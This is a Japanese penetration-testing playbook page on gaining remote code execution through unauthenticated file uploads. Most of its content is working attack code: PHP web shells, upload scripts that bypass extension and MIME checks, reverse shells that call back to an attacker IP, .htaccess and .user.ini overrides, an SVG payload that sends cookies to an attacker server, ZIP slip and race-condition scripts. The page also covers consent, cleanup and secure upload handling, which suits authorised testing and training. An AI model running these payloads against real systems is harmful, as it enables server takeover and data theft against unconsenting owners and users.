# 未認証ファイルアップロードによる RCE

## 着火条件

- Webアプリにファイルアップロード機能がある
- **認証チェックがサーバー側で行われていない**（セッション不要でアップロードエンドポイントに直接 POST できる）
- アップロードしたファイルにWebからアクセスできる（アップロードディレクトリが公開されている）
- サーバーがスクリプト言語（PHP・ASP.NET・JSP 等）を実行できる

> **着火シグナル：** アプリ名とバージョンが判明した時点で searchsploit に「unauthenticated file upload」ヒットがあれば即検討。
> ソースコードが入手できる場合は `upload.php` 等のアップロードハンドラを直接読んで認証チェックの有無を確認する。

## 環境前提

- 実行環境: テスター端末
- 必要なツール: `curl`（ペネトレ用Linuxディストリ標準）/ Python3（標準搭載）
- オフライン代替: `curl` は全環境で使用可。Python の `requests` ライブラリが必要な場合は `pip install requests --break-system-packages`

## 観点・着眼点

**先に確認すること：**
1. アップロードエンドポイントのURL（例: `/upload.php`・`/api/upload`）を特定する
2. アップロードしたファイルが保存・公開されるパスを特定する（例: `/upload/`・`/files/`）
3. サーバーがどのスクリプト言語を実行するか確認する（レスポンスヘッダー・nmap バナー）

**なぜ未認証で刺さるのか：**
アップロード処理ファイルでセッション確認を行い忘れているか、
`id` のような GET パラメータを認証トークン代わりに使っているが実際は検証していないケース。
ソースを読むとわかる場合は `$_SESSION` の確認・`isset()` チェックの欠落を探す。

**バイパス手法（どれが通るかは環境依存）：**

| バイパス手法 | 概要 | 使う場面 |
|------------|------|---------|
| 二重拡張子（double extension） | `shell.php.png` として送信 → サーバーが `.php` として実行 | ファイル名の末尾拡張子のみチェックしているとき |
| マジックバイト前置 | PNGのマジックバイト（`\x89\x50\x4e\x47\x0d\x0a\x1a\x0a`）をファイル先頭に追加 | Content-Type または先頭バイトでファイル種別を判定しているとき |
| Content-Type 偽装 | `Content-Type: image/png` を指定しながら PHP コードを送信 | MIME タイプのみチェックしているとき |
| 拡張子リスト外のスクリプト拡張子 | `.php5`・`.phtml`・`.asp`・`.aspx` 等を試す | 特定の拡張子のみブラックリストで弾いているとき |

## 手順

**事前準備（必須）：**

- アップロードファイルの保存先URLを確認する（ソースコード・ディレクトリ列挙・レスポンス本文から特定）
- テスター端末でリバースシェルのリスナーを先に起動しておく（Webシェル経由でリバースシェルを実行する場合）

```bash
# [Attacker] リスナー起動（別ターミナル）
nc -lnvp 4444
```

**Step 1: Webシェルペイロードを作成する**

```bash
# [Attacker] PHP Webシェル（コマンド実行）
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell.php
```

**Step 2: バイパスを組み合わせてアップロードする（curl の場合）**

```bash
# [Attacker] 二重拡張子 + Content-Type 偽装
curl -s -X POST "http://[TARGET]/upload.php?id=test" \
  -F "file=@shell.php;filename=shell.php.png;type=image/png" \
  -F "pupload=upload"
```

**Step 2（代替）: Python で PNG マジックバイトを前置してアップロード**

```python
# [Attacker] ファイル: upload_shell.py
import requests

url = "http://[TARGET]/upload.php?id=test"
s = requests.Session()
s.get(url, verify=False)

# PNG マジックバイト（8バイト）をシェルコードの前に追加
PNG_magic = b'\x89\x50\x4e\x47\x0d\x0a\x1a\x0a'
payload_code = b'<?php echo shell_exec($_GET["cmd"]); ?>'

png = {
    'file': (
        'test.php.png',              # ファイル名（二重拡張子）
        PNG_magic + b'\n' + payload_code,
        'image/png',                 # Content-Type 偽装
        {'Content-Disposition': 'form-data'}
    )
}
data = {'pupload': 'upload'}
r = s.post(url=url, files=png, data=data, verify=False)
print(r.status_code, r.text[:200])
```

```bash
# [Attacker] 実行
python3 upload_shell.py
```

**Step 3: Webシェルの動作確認**

```bash
# [Attacker] アップロード先のパス + ファイル名でアクセス（idパラメータがファイル名になる場合）
curl "http://[TARGET]/upload/test.php?cmd=whoami"
# → [HOSTNAME]\[USER] のような出力が返れば Webシェル動作確認完了
```

**Step 4: リバースシェルに昇格**

ターゲットが Windows の場合：

```bash
# [Attacker] nc64.exe 等のリバースシェルバイナリを HTTP サーバーで配信
wget https://github.com/[ソース]/nc64.exe   # または手元に用意
python3 -m http.server 80
# テスター側の到達可能インターフェース（環境による: ip a で確認）のIPを使う
```

```bash
# [Attacker] Webシェル経由で PowerShell IWR を使いターゲットにダウンロードさせる
# URL エンコードが必要（ブラウザで開く場合は不要）
curl "http://[TARGET]/upload/test.php?cmd=powershell+Invoke-WebRequest+-Uri+http://[ATTACKER_IP]/nc64.exe+-OutFile+c:\users\public\nc.exe"

# リバースシェルを実行（nc64.exe が `-e` 対応ビルドである前提）
curl "http://[TARGET]/upload/test.php?cmd=c:\users\public\nc.exe+[ATTACKER_IP]+4444+-e+cmd.exe"
```

> **`nc.exe -e` のビルド前提:** **純正 GNU netcat の Windows ビルドには `-e` オプションが含まれていない**ことが多く、`unknown option -e` で落ちる。`-e` を使うなら **(a) Nmap 同梱の `ncat.exe`**（Nmap インストールで一緒に入る・`-e` 対応）、または **(b) "gaping security hole" 版 `nc.exe`**（古典的に `-e` 含むビルド・GitHub の `int0x33/nc.exe` 等）を上げる。判別がつかない場合は安全側で `ncat.exe` を使う：
> ```bash
> curl "http://[TARGET]/upload/test.php?cmd=c:\users\public\ncat.exe+[ATTACKER_IP]+4444+-e+cmd.exe"
> # または PowerShell 経由でリバースシェル（nc 不要）
> curl "http://[TARGET]/upload/test.php?cmd=powershell+-c+%22%24c%3Dnew-object+system.net.sockets.tcpclient%28%27[ATTACKER_IP]%27%2C4444%29%3B...%22"
> ```

ターゲットが Linux の場合：

```bash
# [Attacker] bash リバースシェルを URL エンコードして実行
# シングルクォート `'` も `%27` で統一しておくと URL パーサ差での事故を防げる
curl "http://[TARGET]/upload/shell.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/[ATTACKER_IP]/4444+0%3E%261%27"
```

## 代表的なバイパス・派生攻撃

直球の `shell.php` アップロードが弾かれた / 拡張子チェックが堅い環境向けの典型回避経路。

### filename パラメータでのパストラバーサル

multipart の `filename=` フィールドにパストラバーサルを混ぜると、サーバ側で `dirname/basename` のみ切り出していない実装で **指定先に直接書き込めることがある**。アップロードディレクトリが非公開（実行不可）でも、これで公開ディレクトリに `.php` を置けば実行に持ち込める。

```bash
# [Attacker] filename にパストラバーサルを仕込む
curl -F 'file=@shell.php;filename=../../../var/www/html/shell.php' http://[TARGET]/upload

# 試す保存先候補:
#   ../../../var/www/html/shell.php           # Apache / Nginx 公開ルート
#   ../../public/uploads/shell.php            # Web 公開直下
#   ../templates/shell.php                    # CMS のテンプレート（読込時に実行されるケース）
#   /var/www/html/.htaccess                   # .htaccess 直接上書き（下記）
```

### `.htaccess` / `.user.ini` 自体のアップロード

拡張子ブラックリストが堅くて `.php` / `.phtml` / `.php5` 等が全て弾かれる環境では、**サーバ設定ファイル自体を上げて画像ディレクトリで PHP 実行を許可させる**経路がある。

```apache
# [Attacker] .htaccess を upload/ に置いて画像ディレクトリでも PHP 実行されるようにする
AddType application/x-httpd-php .png .jpg .gif
# その後 shell.png（中身は PHP）をアップロードして /upload/shell.png にアクセス → PHP として実行
```

```ini
; [Attacker] .user.ini （PHP 5.3+ で動く）— ファイル名チェックが .htaccess を弾く環境向け
; アップロードディレクトリに置くと同ディレクトリの PHP の初期化値を変える
; 例: auto_prepend_file で別の PHP を強制 include
auto_prepend_file = "shell.png"
```

```bash
# [Attacker] それぞれをアップロード
curl -F 'file=@.htaccess;filename=.htaccess' http://[TARGET]/upload
curl -F 'file=@.user.ini;filename=.user.ini' http://[TARGET]/upload
curl -F 'file=@shell.png' http://[TARGET]/upload
# その後 /upload/shell.png にアクセス
```

### ポリグロット（画像 + スクリプト）

Content-Type / マジックバイト判定（`getimagesize()` 等）を通過させるために、画像として valid な先頭 + スクリプト本体を連結する。

```bash
# [Attacker] GIF マジックバイト + PHP
printf 'GIF89a;\n<?php system($_GET["cmd"]); ?>\n' > shell.gif
# getimagesize() は GIF として認識・ファイル拡張子が .php / .phtml で保存されれば PHP として実行

# [Attacker] 実存 PNG ファイル末尾に PHP を追記
cp legit.png poly.png
echo '<?php system($_GET["cmd"]); ?>' >> poly.png
# 画像表示も生き残るパターン
```

### SVG 内 JavaScript（保存型 XSS への昇格）

SVG は XML で、`<script>` タグや `onload` 属性を持てる。**画像扱いで受け入れられがちなのに XSS のキャリアになる。**

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://[ATTACKER_HTTP_SERVER]/c?'+document.cookie)">
  <script type="text/javascript">
    alert(document.domain);
    // 攻撃者サーバへ送信
    fetch('http://[ATTACKER_HTTP_SERVER]/c?'+document.cookie);
  </script>
</svg>
```

> アップロード後の URL が `<img src="...">` ではなく **直接ブラウザで表示される経路**（プレビュー / ダウンロード時に Content-Type が `image/svg+xml`）なら XSS 成立。詳細は `XSS.md`。

### ZIP slip（アーカイブ展開系アップロード）

ZIP / TAR / RAR を受け取って展開するアップローダで、エントリ名に `../` を含めると **展開先の外**に書き出せる。

```bash
# [Attacker] ZIP slip ペイロード
mkdir -p tmpzip && cd tmpzip
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# zip エントリ名にパストラバーサルを仕込む（python の zipfile で生 ZIP を組み立てる）
python3 -c "
import zipfile
with zipfile.ZipFile('../slip.zip', 'w') as z:
    z.writestr('../../../var/www/html/shell.php', open('shell.php').read())
"
# slip.zip をアップロード → サーバ側展開で /var/www/html/shell.php が出現
```

### Null byte 埋め込み（古い PHP / 古いライブラリ向け）

PHP 5.3.x 以下や CGI 経由で動く古い実装では、ファイル名中の `%00`（NULL）が C 文字列の終端として扱われ、**`shell.php%00.png` を `shell.php` として保存しつつ拡張子チェックは `.png` を見る**実装ミスが成立する。

```bash
# [Attacker] null byte 埋め込み（古い PHP / 古いライブラリ向け）
curl -F 'file=@shell.php;filename=shell.php%00.png' http://[TARGET]/upload
# 現代環境ではほぼ閉じているが、レガシ環境では現役の手
```

### TOCTOU レース（リネーム前にアクセス）

アップロード処理が「(1) 受信 → (2) 一時パスに保存 → (3) 検証 → (4) 拒否なら削除 / 受理なら最終パスへリネーム」の流れの場合、**(2) と (4) の間に攻撃者がアクセスできる**経路があれば、検証で拒否される予定のファイルでも実行できる。

```bash
# [Attacker] アップロードと並行に大量リクエストを撃つ
( curl -F 'file=@shell.php' http://[TARGET]/upload & ) ;
for i in $(seq 1 10000); do
  curl -s "http://[TARGET]/tmp/[PREDICTABLE_TEMP_NAME]?cmd=id" &
done; wait
```

> 一時ファイル名が予測可能（タイムスタンプ・連番）+ 一時保存パスが Web 公開ディレクトリ配下 + 検証に時間がかかる、の 3 条件が揃うと刺さる。

---

## PoC の信頼性確認と事前検証

searchsploit が「unauthenticated file upload」と説明している場合、その記述を信頼して試すのが基本姿勢。
ただし以下の方法で事前に根拠を確認しておくと、試行の精度が上がる。

**PoC 説明文から読み取れる情報：**

```bash
# [Attacker] PoC の詳細を確認（コードを作業フォルダにコピーする前に読む）
searchsploit -x [PATH_FROM_RESULTS]
```

確認すべき点：
- 「Unauthenticated」の根拠：「No authentication required」「does not check session」等の記述があるか
- 対象バージョン：特定のマイナーバージョンのみ対象の場合があるため、自分のターゲットと一致しているか
- 前提条件：ファイルアップロードが有効になっていることが前提になっていないか

**アプリのソースコードが入手できる場合（任意）：**

攻撃対象のアプリ（オープンソース・公開リポジトリ）のソースが手に入る場合、
アップロードハンドラを読んで認証チェックの欠落を確認できる。

```bash
# [Attacker] 公開されているソースを取得
wget [公開リポジトリのURL]
unzip [zip_file]
```

**アップロードハンドラで確認すべき観点：**

| 確認する観点 | セキュアな実装 | 脆弱な実装（着火条件） |
|------------|-------------|-------------------|
| セッション確認 | `session_start(); if (!isset($_SESSION['user'])) { die(); }` | セッション確認なし |
| ファイルタイプ確認 | `$allowedTypes = ['image/jpeg', 'image/png']; if (!in_array($type, $allowedTypes)) { die(); }` | MIME タイプをクライアント入力のまま信用 |
| 拡張子確認 | ホワイトリスト + 末尾拡張子のみ | ブラックリストのみ、または末尾以外の拡張子を見ない |
| 保存先 | Web 非公開ディレクトリ + ランダムファイル名 | `upload/` 等の公開パス + 元ファイル名そのまま |

**ソースを読まなくても試せる順序：**
1. searchsploit の PoC をそのまま実行 → 動けばそれで十分
2. 動かない場合 → PoC の説明文を読んで前提条件を確認
3. ソースが入手できる場合は上の表で認証チェックの欠落を探す

## 刺さらなかったとき

| 症状 | 原因の推定 | 次のアクション |
|------|----------|--------------|
| アップロードは成功するがスクリプトとして実行されない | アップロードディレクトリがスクリプト実行を禁止している（`.htaccess` / IIS の設定） | 別のアップロードディレクトリを探す / `.htaccess` 自体をアップロードして上書きを試みる |
| 403 / 401 が返る | 認証チェックが存在する | 認証済みセッションのクッキーをヘッダーに付けて再送 |
| 拡張子が弾かれる（エラーメッセージあり） | ホワイトリスト制御 | 別のスクリプト拡張子（`.php5`・`.phtml`・`.asp`）を試す |
| ファイルが上書きされ内容が変わる | ファイル名の重複・sanitization | `id` パラメータを変えてユニークなファイル名を生成する |
| アップロード後のパスが不明 | 保存先が非公開ディレクトリ | レスポンス本文・ソースコード・ディレクトリ列挙でパスを確認 |

## 注意点・落とし穴

- **ファイルの残存（原状回復）：** アップロードした Webシェルはテスト完了後に削除する。
  確認方法: `curl "http://[TARGET]/upload/"` でファイル一覧を確認 → 手動削除または DELETE リクエスト。
- PHP の `shell_exec` が無効になっている場合は `system()`・`passthru()`・`exec()` を代替として試す
- `curl` の `-F` でファイル名にスペースや特殊文字が含まれる場合はクォートで括る
- Content-Type の偽装だけでは通らない場合はマジックバイトの前置を組み合わせる

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 不可逆な変更を含む（アップロードファイルが残存する）
> - [x] 業務停止リスク（サービス・認証）— `.htaccess` / `.user.ini` の上書きは同ディレクトリの他ファイルの挙動を変える / Web シェル放置で他攻撃者からのピボット起点になる
> - [ ] 持続化に該当
> - [ ] SIEM/EDR で確実に検知される
> 実施可否は事前合意で明示確認すること。**`.htaccess` / `.user.ini` を書き換えた場合は原状回復必須**（元の内容を保存してから書き換える）。

## 本番での前提

- **事前合意の要否**: ★★（ファイルアップロード機能の悪用は事前合意で範囲明示が必要）
- **業務影響リスク**: アップロードディレクトリへの書き込み（本来のファイルに影響なし・サーバー負荷は軽微）
- **原状回復必須項目**: ✅ アップロードしたシェルファイルを削除する
- **演習環境での扱い**: 制約なし

## 関連技術

- 前：Webアプリのフレームワーク・アプリ名の特定 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：searchsploit で「unauthenticated file upload」を確認 → `../../05_Tools_Reference/Searchsploit.md`
- 後：Webシェルからリバースシェルへの昇格 → `./Command_Injection.md`（リバースシェル配信セクション）
- 後：Windowsで初期シェル取得後の列挙 → `../../04_Post_Access_Windows_AD/Enumeration_Checklist.md`
